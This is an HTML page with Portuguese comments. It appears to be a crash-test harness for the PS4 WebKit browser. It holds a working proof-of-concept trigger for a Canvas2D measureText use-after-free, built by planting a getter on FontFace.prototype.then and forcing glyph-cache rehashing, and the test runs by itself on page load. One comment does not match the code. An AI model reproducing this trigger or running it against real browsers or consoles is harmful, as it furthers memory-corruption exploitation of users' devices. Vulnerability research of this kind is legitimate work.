button{margin:2px;padding:3px 10px;background:#333;color:#ddd;border:1px solid #555;cursor:pointer}
</style>

<body>
<div id="err"></div>
<div id="st">Pronto</div><br>
<button onclick="runAll()">Executar Testes (Risco de Crash)</button>
<button onclick="clearLS()">Limpar LS (Reset)</button>
<button onclick="location.reload()">Reload</button>
<div id="out"></div>

<script>
// ES5 puro para máxima compatibilidade com WebKit 605.1.15
window.onerror = function(msg, url, line) {
    var e = document.getElementById('err');
    e.style.display = 'block';
    e.innerHTML = 'ERRO JS linha ' + line + ': ' + msg;
    return true;
};

var OUT = null;
var CUR = null;
var LS = 'ps4d6_';

function setStatus(s) { document.getElementById('st').innerHTML = s; }

function newSection(title) {
    OUT = OUT || document.getElementById('out');
    var h = document.createElement('h2');
    h.innerHTML = title;
    OUT.appendChild(h);
    CUR = document.createElement('div');
    OUT.appendChild(CUR);
}

function addRow(label, val, cls) {
    var c = cls || (val === true ? 'ok' : val === false ? 'no' : 'in');
    var d = val === true ? 'SIM' : val === false ? 'NAO' : String(val);
    var r = document.createElement('div');
    r.className = 'r';
    r.innerHTML = '<span class="l">' + label + '</span><span class="' + c + '">' + d + '</span>';
    CUR.appendChild(r);
}

function lsSet(k, v) { try { localStorage.setItem(LS+k, v); } catch(e) {} }
function lsGet(k)    { try { return localStorage.getItem(LS+k); } catch(e) { return null; } }
function lsDel(k)    { try { localStorage.removeItem(LS+k); } catch(e) {} }

function clearLS() {
    try {
        var keys = [];
        for (var i = 0; i < localStorage.length; i++) {
            var k = localStorage.key(i);
            if (k && k.indexOf(LS) === 0) keys.push(k);
        }
        for (var j = 0; j < keys.length; j++) localStorage.removeItem(keys[j]);
    } catch(e) {}
    setStatus('LS limpo');
}

function cleanGetter() {
    try {
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true, writable: true, value: undefined
        });
    } catch(e) {}
}

// ============================================================
// A: Canvas2D measureText UAF (Commit 155bd63)
// ============================================================
function sA() {
    newSection('A. Canvas2D measureText UAF (Glyph Cache Rehash)');

    if (typeof FontFace === 'undefined') { addRow('FontFace ausente','skip','wn'); return; }
    var prev = lsGet('A_crash');
    if (prev) { addRow('!! CRASH ANTERIOR EM:', prev, 'cr'); lsDel('A_crash'); }

    lsSet('A_crash', 'Canvas2D measureText');
    var fired = false;
    
    // 1. Criar Canvas na Main Thread (PS4 não tem OffscreenCanvas)
    var canvas = document.createElement('canvas');
    canvas.width = 10; canvas.height = 10;
    var ctx = canvas.getContext('2d');
    
    // 2. Criar FontFace e armar a armadilha
    var family = 'VarFam' + Date.now();
    var face = new FontFace(family, 'local(Helvetica)');
    void face.loaded; 
    document.fonts.add(face);
    
    try {
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get: function() {
                if (fired) return undefined;
                fired = true;
                
                // Payload exato do commit 155bd63 (adaptado para Main Thread)
                for (var i = 0; i < 16; i++) {
                    try {
                        var c2 = document.createElement('canvas');
                        var cx2 = c2.getContext('2d');
                        cx2.font = '20px Helvetica, ' + family;
                        cx2.measureText('q' + String.fromCharCode(65 + i) + 'z');
                    } catch (e) { }
                    try { ctx.measureText('x'); } catch (e) { }
                }
                return undefined;
            }
        });

        // Gatilho: Preenche o cache e depois força o fallback
        ctx.font = '20px Helvetica, ' + family;
        for (var j = 0; j < 50; j++) {
            ctx.measureText('x');
        }
        // U+E005 não existe em Helvetica, força a resolução síncrona da face pendente
        ctx.measureText('AB'); 

    } catch(e) {
        addRow('Erro', e.message, 'no');
    } finally {
        cleanGetter();
    }
    addRow('Canvas2D measureText UAF', fired ? 'Disparou (sem crash imediato)' : 'Não disparou', fired ? 'ok' : 'wn');
    lsDel('A_crash');
}

// ============================================================
// MAIN
// ============================================================
function runAll() {
    OUT = document.getElementById('out');
    OUT.innerHTML = '';
    setStatus('Rodando...');

    var prevCrash = lsGet('A_crash') || lsGet('B_crash') || lsGet('C_crash');
    if (prevCrash) {
        newSection('!! CRASH DETECTADO NA SESSAO ANTERIOR !!');
        addRow('Payload que derrubou o browser', prevCrash, 'cr');
        clearLS(); 
    }

    try { sA(); } catch(e) { if(CUR) addRow('SA ERRO FATAL',''+e,'no'); }
  //  try { sB(); } catch(e) { if(CUR) addRow('SB ERRO FATAL',''+e,'no'); }
   // try { sC(); } catch(e) { if(CUR) addRow('SC ERRO FATAL',''+e,'no'); }

    setStatus('Concluido');
}

setTimeout(function() { runAll(); }, 300);
</script>
